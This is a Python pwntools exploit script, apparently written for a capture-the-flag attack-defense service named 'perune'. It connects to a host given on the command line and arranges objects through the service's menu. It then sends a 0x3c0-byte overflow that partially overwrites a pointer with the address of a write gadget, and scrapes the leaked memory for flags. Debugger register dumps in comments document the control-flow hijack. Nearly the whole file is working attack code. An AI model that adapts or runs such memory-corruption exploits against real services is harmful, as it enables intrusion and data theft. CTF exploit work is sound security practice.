#!/usr/bin/env python3

import re
import sys
from typing import Optional

import pwn


def do_make_gift(
        io: pwn.tube,
        type: int,
        count: int,
        password: bytes,
) -> bytes:
    io.sendlineafter(b'> ', b'1')

    io.sendlineafter(b'> ', str(type).encode())
    io.sendlineafter(b': ', str(count).encode())
    io.sendlineafter(b': ', password)

    io.recvuntil(b'id: ')
    gift_id = io.recvline().strip()

    return gift_id


def do_view_gift(
        io: pwn.tube,
        gift_id: bytes,
        password: Optional[bytes] = None,
) -> None:
    io.sendlineafter(b'> ', b'2')

    io.sendlineafter(b': ', gift_id)

    if password is not None:
        io.sendlineafter(b': ', password)

    # io.recvuntil(b'Link id: ')
    # link_id = io.recvline().strip()

    # return link_id


def do_make_prayer(
        io: pwn.tube,
        gift_id: bytes,
        password: bytes, text: bytes,
) -> bytes:
    io.sendlineafter(b'> ', b'3')

    io.sendlineafter(b': ', gift_id)
    io.sendlineafter(b': ', password)
    io.sendlineafter(b': ', text)

    io.recvuntil(b'id: ')
    prayer_id = io.recvline().strip()

    return prayer_id


def do_call_perune(
        io: pwn.tube,
        prayer_id: bytes,
) -> bytes:
    io.sendlineafter(b'> ', b'4')

    io.sendlineafter(b': ', prayer_id)
    response = io.recvline().strip()

    return response


def do_exit(io: pwn.tube) -> None:
    io.sendlineafter(b'> ', b'5')


def leak_flag(io: pwn.tube) -> bytes:
    leak = b''

    while True:
        part = io.recv(0x1000)
        leak += part

        if len(part) == 0:
            raise Exception('no flag in data')
        
        flags = re.findall(rb'[0-9A-Z]{31}=', leak)

        if len(flags) > 0:
            return flags[0]


def attack(io: pwn.tube, flag_id: bytes) -> bytes: 
    gift_id1 = do_make_gift(io, 1, 1, b'11111111')

    gift_id2 = do_make_gift(io, 2, 1000, b'22222222')
    prayer_id2 = do_make_prayer(io, gift_id2, b'22222222', b'x')

    do_view_gift(io, flag_id, b'a')

    prayer_id1 = do_make_prayer(io, gift_id1, b'11111111', b'y')

    # *RAX  0x7ffeedc48f00 ◂— 0x0
    # *RBX  0x6335e0 (std::cout) —▸ 0x62d8c0 (vtable for std::ostream+24) —▸ 0x4a6b30 (std::basic_ostream<char, std::char_traits<char> >::~basic_ostream()) ◂— endbr64 
    # *RCX  0x4d2b66 (std::__basic_file<char>::xsputn(char const*, long)+54) ◂— mov edi, r12d
    # *RDX  0x21b7480 —▸ 0x21b9450 —▸ 0x4d2b66 (std::__basic_file<char>::xsputn(char const*, long)+54) ◂— mov edi, r12d
    # *RDI  0x7ffeedc48f00 ◂— 0x0
    # *RSI  0x21b7480 —▸ 0x21b9450 —▸ 0x4d2b66 (std::__basic_file<char>::xsputn(char const*, long)+54) ◂— mov edi, r12d
    # *R8   0x30
    # *R9   0x550
    #  R10  0xc70f6907
    #  R11  0x246
    # *R12  0x1
    # *R13  0x7ffeedc49478 —▸ 0x7ffeedc4a685 ◂— './perune'
    # *R14  0x625bf0 (__preinit_array_start) —▸ 0x4047c0 (frame_dummy) ◂— endbr64 
    #  R15  0x9
    # *RBP  0x7ffeedc49160 —▸ 0x7ffeedc491e0 —▸ 0x7ffeedc49270 —▸ 0x7ffeedc49290 ◂— 9 /* '\t' */
    # *RSP  0x7ffeedc48ec8 —▸ 0x405c79 (AddObjectToDb(Object*)+98) ◂— lea rax, [rbp - 0x220]
    # *RIP  0x4d2b66 (std::__basic_file<char>::xsputn(char const*, long)+54) ◂— mov edi, r12d

    # 0x4d2b66 <_ZNSt12__basic_fileIcE6xsputnEPKcl+54>:	mov    edi,r12d
    # 0x4d2b69 <_ZNSt12__basic_fileIcE6xsputnEPKcl+57>:	call   0x570270 <write>

    leak_gadget = 0x4d2b66

    do_call_perune(io, prayer_id1)

    chain = B'A' * 0x3c0 + pwn.p64(leak_gadget)[:-1]
    do_view_gift(io, chain)

    do_call_perune(io, prayer_id2)

    return leak_flag(io)


def main() -> None:
    host = sys.argv[1]
    flag_id = sys.argv[2]

    # io = pwn.process('./perune')
    io = pwn.remote(host, 18484)

    try:
        flag = attack(io, flag_id.encode())
        print(flag)
    finally:
        io.close()


if __name__ == '__main__':
    main()
